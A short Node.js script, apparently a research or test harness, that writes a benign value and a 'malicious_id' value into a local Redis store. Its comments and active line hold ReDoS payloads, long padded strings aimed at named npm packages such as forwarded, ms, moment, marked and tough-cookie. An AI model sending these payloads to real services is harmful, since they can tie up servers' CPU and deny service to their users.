var redis = require('redis');
var client = redis.createClient(6379, "127.0.0.1"); // this creates a new client

client.on('connect', function() {
    console.log('Redis client connected');
});

client.set('benign_id', 'x'.repeat(1024), redis.print);

// fresh
// client.set('malicious_id', 'x' + ' '.repeat(26000) + "x", redis.print);

// charset
// 'encoding=' + ' ' * length
// client.set('malicious_id', 'encoding=' + ' '.repeat(24000), redis.print);

// ua-parser
// 'iphone ios ' + 'a' * length
// client.set('malicious_id', 'iphone ios ' + 'a'.repeat(26), redis.print);

// content	
// 'x/x;x=' + ' ' * length + '="x'
// client.set('malicious_id', 'x/x;x=' + ' '.repeat(21000) + '="x', redis.print);

// forwarded
// 'x' + ' ' * length + 'x'
client.set('malicious_id', 'x' + ' '.repeat(25000) + "x", redis.print);

// mobile-detect
// 'Dell' * length
// client.set('malicious_id', 'Dell'.repeat(7000), redis.print);

// platform	
// 'Windows Icarus6j' + ' ' * length
// client.set('malicious_id', 'Windows Icarus6j' + ' '.repeat(28000), redis.print);

// userageent
// 'A' * length + '123'
// client.set('malicious_id', 'A'.repeat(880) + '123', redis.print);

// tough-cookie	
// 'x' + ' ' * length + 'x'
// client.set('malicious_id', 'x' + ' '.repeat(29000) + "x", redis.print);

// moment
// '1' * length
// client.set('malicious_id', '1'.repeat(25500), redis.print);

// uglify-js
// 'var a = ' + '1' * length + ".1ee7;"
// client.set('malicious_id', 'var a = ' + '1'.repeat(24000) + ".1ee7;", redis.print);

// ms
// '5' * length + ' minutea'
// client.set('malicious_id', '5'.repeat(11500) + ' minutea', redis.print);

// marked
// '`' * 8 + ' ' * length + '`' * 11
// client.set('malicious_id', '`'.repeat(8) + ' '.repeat(490) + '`'.repeat(11), redis.print);

client.get('benign_id', function (error, result) {
    if (error) {
        console.log(error);
        throw error;
    }
    console.log('GET result ->' + result);
});

client.get('malicious_id', function (error, result) {
    if (error) {
        console.log(error);
        throw error;
    }
    console.log('GET result ->' + result);
});

client.quit();
